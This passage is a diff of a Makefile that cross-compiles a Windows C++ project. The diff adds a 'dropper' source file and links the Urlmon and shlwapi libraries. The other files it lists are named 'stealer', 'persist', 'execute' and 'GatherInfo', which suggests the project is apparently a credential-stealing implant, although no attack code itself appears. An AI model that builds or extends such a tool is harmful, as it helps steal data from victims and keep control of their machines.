@@ -1,9 +1,9 @@
 MAC = x86_64-w64-mingw32-g++ 
 CXX = g++
-LIBRARIES = -lwinhttp -lcrypt32 -luserenv -lbcrypt -static
+LIBRARIES = -lWinHttp -lcrypt32 -luserenv -lbcrypt -lshlwapi -lUrlmon -static
 
 FILES = execute/execute.cpp file/file.cpp http/http.cpp persist/persist.cpp
-FILES2 = situational_awareness/GatherInfo.cpp
+FILES2 = situational_awareness/GatherInfo.cpp dropper/Dropper.cpp
 FILES3 = stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp
 
 apple: $(eval SHELL:=/bin/zsh)
